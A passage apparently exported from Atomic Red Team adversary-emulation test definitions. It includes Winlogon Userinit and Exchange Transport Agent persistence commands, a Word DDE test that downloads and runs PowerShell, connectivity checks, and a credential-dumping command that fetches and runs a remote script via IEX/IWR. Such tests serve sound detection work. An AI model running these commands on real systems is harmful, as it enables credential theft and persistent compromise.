<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f9b8daff-8fa7-4e6a-a1a7-7c14675a545b</li>
<li><strong>name</strong>: Winlogon HKLM Userinit Key Persistence - PowerShell</li>
<li><strong>description</strong>: PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.</li>
</ul>
<p>Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 43e92449-ff60-46e9-83a3-1a38089df94d</li>
<li><strong>name</strong>: Install MS Exchange Transport Agent Persistence</li>
<li>
<p><strong>description</strong>: Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.
More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
Enable-TransportAgent #{transport_agent_identity}
Get-TransportAgent | Format-List Name,Enabled</p>
</li>
<li>
<p><strong>prereq_command</strong>: Get-TransportAgent -TransportService FrontEnd</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn</p>
</li>
<li>
<p><strong>cleanup_command</strong>: if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
  Disable-TransportAgent #{transport_agent_identity}
  Uninstall-TransportAgent #{transport_agent_identity}
  Get-TransportAgent
}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1505.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 47c21fb6-085e-4b0d-b4d2-26d72c3830b3</li>
<li><strong>name</strong>: Execute PowerShell script via Word DDE</li>
<li>
<p><strong>description</strong>: When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: start "$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1559.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f8160cde-4e16-4c8b-8450-6042d5363eb0</li>
<li><strong>name</strong>: Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping)</li>
<li>
<p><strong>description</strong>: Check internet connection using PowerShell's Test-NetConnection cmdlet and the ICMP/Ping protocol. The default target is 8.8.8.8 (Google Public DNS).</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Test-NetConnection -ComputerName #{target}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1016.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: {'description': 'target of the request', 'type': 'string', 'default': '8.8.8.8'}</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7c35779d-42ec-42ab-a283-6255b28e9d68</li>
<li><strong>name</strong>: Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP)</li>
<li>
<p><strong>description</strong>: Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound HTTP (Port 80) access. The default target is www.google.com.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1016.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: {'description': 'target of the request', 'type': 'string', 'default': 'www.google.com'}</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d9c32b3b-7916-45ad-aca5-6c902da80319</li>
<li><strong>name</strong>: Check internet connection using Test-NetConnection in PowerShell (TCP-SMB)</li>
<li>
<p><strong>description</strong>: Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound SMB (Port 445) access. The default target is 8.8.8.8.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Test-NetConnection -CommonTCPPort SMB -ComputerName #{target}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1016.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: {'description': 'target of the request', 'type': 'string', 'default': '8.8.8.8'}</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c89becbe-1758-4e7d-a0f4-97d2188a23e3</li>
<li><strong>name</strong>: Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]</li>
<li><strong>description</strong>: This module will extract the credentials from Windows Credential Manager</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   </p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1555</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
